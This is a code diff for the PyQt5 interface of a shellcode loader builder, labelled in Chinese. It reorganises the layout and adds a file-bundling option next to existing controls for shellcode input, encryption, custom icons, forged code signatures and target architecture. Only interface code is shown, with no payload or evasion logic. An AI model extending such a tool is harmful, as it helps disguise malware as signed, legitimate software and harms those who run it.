@@ -2,11 +2,11 @@ import os
 from PyQt5.QtCore import QSize
 from PyQt5.QtWidgets import (
     QWidget, QPushButton, QTextEdit, QLineEdit,
-    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox, QComboBox
+    QVBoxLayout, QHBoxLayout, QGroupBox, QMessageBox, QProgressBar, QCheckBox, QComboBox, QFrame
 )
 from PyQt5.QtGui import QIcon, QMovie
 
-from .widgets import BinComboBox, IcoComboBox
+from .widgets import BinComboBox, IcoComboBox, BundleComboBox
 from .sign import SignAppComboBox
 from .worker import WorkerThread
 from .styles import get_main_stylesheet
@@ -36,12 +36,10 @@ class LoaderGUI(QWidget):
 
     def init_ui(self):
         layout = QVBoxLayout()
-        layout.setSpacing(16)
+        layout.setSpacing(1)
         folder_icon = get_folder_icon()
         
-        layout.addWidget(self._create_bin_group(folder_icon))
-
-        layout.addWidget(self._create_load_payload_group())
+        layout.addWidget(self._create_bin_and_payload_group(folder_icon))
         
         layout.addWidget(self._create_encryption_group())
 
@@ -66,6 +64,10 @@ class LoaderGUI(QWidget):
         self.loading_movie = QMovie(os.path.join('gui', 'icons', 'loading.gif'))
         self.loading_movie.setScaledSize(QSize(100, 100))
         self.loading_movie.frameChanged.connect(self.update_loading_icon)
+        
+        # 初始化控件状态
+        self.on_sign_changed()
+        self.on_forgery_changed()
     
     def _create_bin_group(self, folder_icon):
         bin_group = QGroupBox('Shellcode')
@@ -79,6 +81,35 @@ class LoaderGUI(QWidget):
         bin_layout.addWidget(bin_btn)
         bin_group.setLayout(bin_layout)
         return bin_group
+    
+    def _create_bin_and_payload_group(self, folder_icon):
+        widget = QWidget()
+        layout = QHBoxLayout()
+        layout.setContentsMargins(0, 5, 0, 5)
+        
+        # Shellcode 组
+        bin_group = QGroupBox('Shellcode')
+        bin_layout = QHBoxLayout()
+        self.bin_box = BinComboBox()
+        bin_btn = QPushButton(folder_icon, '')
+        bin_btn.setToolTip('选择shellcode文件')
+        bin_btn.setFixedWidth(32)
+        bin_btn.clicked.connect(lambda: self.bin_box.choose_file(self))
+        bin_layout.addWidget(self.bin_box)
+        bin_layout.addWidget(bin_btn)
+        bin_group.setLayout(bin_layout)
+        
+        # Payload 加载组
+        load_group = QGroupBox('加载')
+        load_layout = QHBoxLayout()
+        self.load_payload_box = create_load_payload_combobox()
+        load_layout.addWidget(self.load_payload_box)
+        load_group.setLayout(load_layout)
+        
+        layout.addWidget(bin_group)
+        layout.addWidget(load_group)
+        widget.setLayout(layout)
+        return widget
     
     def _create_encryption_group(self):
         enc_group = QGroupBox('加解密')
@@ -99,17 +130,44 @@ class LoaderGUI(QWidget):
         return enc_group
     
     def _create_icon_group(self, folder_icon):
-        ico_group = QGroupBox('图标文件')
+        icon_widget = QWidget()
         ico_layout = QHBoxLayout()
+        ico_layout.setContentsMargins(0, 0, 0, 0)
+        
+        # 左侧：图标文件
+        icon_subgroup = QGroupBox('图标文件')
+        icon_sub_layout = QHBoxLayout()
         self.ico_box = IcoComboBox()
         ico_btn = QPushButton(folder_icon, '')
         ico_btn.setToolTip('选择图标文件')
         ico_btn.setFixedWidth(32)
         ico_btn.clicked.connect(lambda: self.ico_box.choose_file(self))
-        ico_layout.addWidget(self.ico_box)
-        ico_layout.addWidget(ico_btn)
-        ico_group.setLayout(ico_layout)
-        return ico_group
+        icon_sub_layout.addWidget(self.ico_box)
+        icon_sub_layout.addWidget(ico_btn)
+        icon_subgroup.setLayout(icon_sub_layout)
+        
+        # 右侧：文件捆绑
+        bundle_subgroup = QGroupBox('文件捆绑')
+        bundle_sub_layout = QHBoxLayout()
+        self.forgery_enable_box = QCheckBox('')
+        self.forgery_enable_box.stateChanged.connect(self.on_forgery_changed)
+        self.bundle_file_box = BundleComboBox()
+        self.bundle_file_box.setFixedWidth(200)
+        self.bundle_file_box.setEnabled(False)
+        self.bundle_choose_btn = QPushButton(folder_icon, '')
+        self.bundle_choose_btn.setToolTip('选择要捆绑的文件')
+        self.bundle_choose_btn.setFixedWidth(32)
+        self.bundle_choose_btn.setEnabled(False)
+        self.bundle_choose_btn.clicked.connect(self.choose_bundle_file)
+        bundle_sub_layout.addWidget(self.bundle_file_box)
+        bundle_sub_layout.addWidget(self.bundle_choose_btn)
+        bundle_sub_layout.addWidget(self.forgery_enable_box)
+        bundle_subgroup.setLayout(bundle_sub_layout)
+        
+        ico_layout.addWidget(icon_subgroup)
+        ico_layout.addWidget(bundle_subgroup)
+        icon_widget.setLayout(ico_layout)
+        return icon_widget
     
     def _create_load_payload_group(self):
         load_group = QGroupBox('Payload 加载')
@@ -158,25 +216,41 @@ class LoaderGUI(QWidget):
         return run_group
     
     def _create_sign_group(self, folder_icon):
-        sign_group = QGroupBox('伪造签名')
+        sign_widget = QWidget()
         sign_layout = QHBoxLayout()
+        sign_layout.setContentsMargins(0, 0, 0, 0)
+
+        # 左侧：目标架构
+        target_subgroup = QGroupBox('目标架构')
+        target_sub_layout = QHBoxLayout()
+        self.target_box = create_target_combobox()
+        self.target_box.setFixedWidth(256)
+        target_sub_layout.addWidget(self.target_box)
+        target_subgroup.setLayout(target_sub_layout)
+
+        # 右侧：伪造签名
+        sign_subgroup = QGroupBox('伪造签名')
+        sign_sub_layout = QHBoxLayout()
         self.sign_app_box = SignAppComboBox()
+        self.sign_app_box.setFixedWidth(200)
         self.sign_choose_btn = QPushButton(folder_icon, '')
         self.sign_choose_btn.setToolTip('选择被伪造应用')
         self.sign_choose_btn.setFixedWidth(32)
         self.sign_choose_btn.clicked.connect(lambda: self.sign_app_box.choose_file(self))
-        self.sign_enable_box = QCheckBox('启用签名')
-        self.forgery_enable_box = QCheckBox('文件捆绑')
-        sign_layout.addWidget(self.sign_app_box)
-        sign_layout.addWidget(self.sign_choose_btn)
-        sign_layout.addWidget(self.sign_enable_box)
-        sign_layout.addWidget(self.forgery_enable_box)
+        self.sign_enable_box = QCheckBox('')
+        self.sign_enable_box.stateChanged.connect(self.on_sign_changed)
+        sign_sub_layout.addWidget(self.sign_app_box)
+        sign_sub_layout.addWidget(self.sign_choose_btn)
+        sign_sub_layout.addWidget(self.sign_enable_box)
+        sign_sub_layout.setStretch(1, 1)
+        sign_subgroup.setLayout(sign_sub_layout)
+    
+        sign_layout.addWidget(target_subgroup)
+        sign_layout.addWidget(sign_subgroup)
         sign_layout.setStretch(0, 1)
-        sign_layout.setStretch(1, 0)
-        sign_layout.setStretch(2, 0)
-        sign_layout.setStretch(3, 0)
-        sign_group.setLayout(sign_layout)
-        return sign_group
+        sign_layout.setStretch(1, 1)
+        sign_widget.setLayout(sign_layout)
+        return sign_widget
     
     def _create_bottom_layout(self):
         bottom_layout = QHBoxLayout()
@@ -192,9 +266,6 @@ class LoaderGUI(QWidget):
         
         fixed_height = 230
         
-        self.target_box = create_target_combobox()
-        self.target_box.setFixedWidth(fixed_height)
-        
         self.win7_checkbox = QCheckBox("Win7 兼容")
         self.win7_checkbox.setChecked(False)          
         self.gen_btn = QPushButton(QIcon(os.path.join('gui', 'icons', 'rocket.ico')), '')
@@ -202,7 +273,6 @@ class LoaderGUI(QWidget):
         self.gen_btn.setFixedSize(fixed_height, fixed_height)
         
         right_layout.addWidget(self.win7_checkbox)
-        right_layout.addWidget(self.target_box)
         right_layout.addWidget(self.gen_btn)
         
         self.gen_btn.clicked.connect(self.run_all)
@@ -258,6 +328,7 @@ class LoaderGUI(QWidget):
         sign_enable = self.sign_enable_box.isChecked()
         sign_app = self.sign_app_box.itemData(self.sign_app_box.currentIndex())
         forgery_enable = self.forgery_enable_box.isChecked()
+        bundle_file = self.bundle_file_box.itemData(self.bundle_file_box.currentIndex()) if forgery_enable else ""
         
         mem_mode = self.mem_mode_box.itemData(self.mem_mode_box.currentIndex())
         if not mem_mode:
@@ -285,6 +356,7 @@ class LoaderGUI(QWidget):
             'sign_enable': sign_enable,
             'sign_app': sign_app,
             'forgery_enable': forgery_enable,
+            'bundle_file': bundle_file,
             'mem_mode': mem_mode,
             'load_payload_mode': load_payload_mode,
             'target': target,
@@ -299,6 +371,35 @@ class LoaderGUI(QWidget):
         self.progress.setValue(0)
         self.log_append('[错误] ' + msg)
         QMessageBox.critical(self, '错误', msg)
+
+    def on_forgery_changed(self):
+        enabled = self.forgery_enable_box.isChecked()
+        self.bundle_file_box.setEnabled(enabled)
+        self.bundle_choose_btn.setEnabled(enabled)
+
+    def on_sign_changed(self):
+        enabled = self.sign_enable_box.isChecked()
+        self.sign_app_box.setEnabled(enabled)
+        self.sign_choose_btn.setEnabled(enabled)
+
+    def choose_bundle_file(self):
+        from PyQt5.QtWidgets import QFileDialog
+        from PyQt5.QtGui import QIcon
+        import os
+        path, _ = QFileDialog.getOpenFileName(self, '选择要捆绑的文件', '', '所有文件 (*)')
+        if path:
+            # Ensure absolute path
+            path = os.path.abspath(path)
+            display_name = os.path.basename(path)
+            bundle_icon = QIcon(os.path.join('gui', 'icons', 'bundle.ico')) if os.path.exists(os.path.join('gui', 'icons', 'bundle.ico')) else QIcon()
+            # Check if already exists
+            for i in range(self.bundle_file_box.count()):
+                if self.bundle_file_box.itemData(i) == path:
+                    self.bundle_file_box.setCurrentIndex(i)
+                    return
+            # Add new item
+            self.bundle_file_box.addItem(bundle_icon, display_name, path)
+            self.bundle_file_box.setCurrentIndex(self.bundle_file_box.count() - 1)
 
     def on_run_mode_changed(self):
         manifest = load_plugins_manifest()
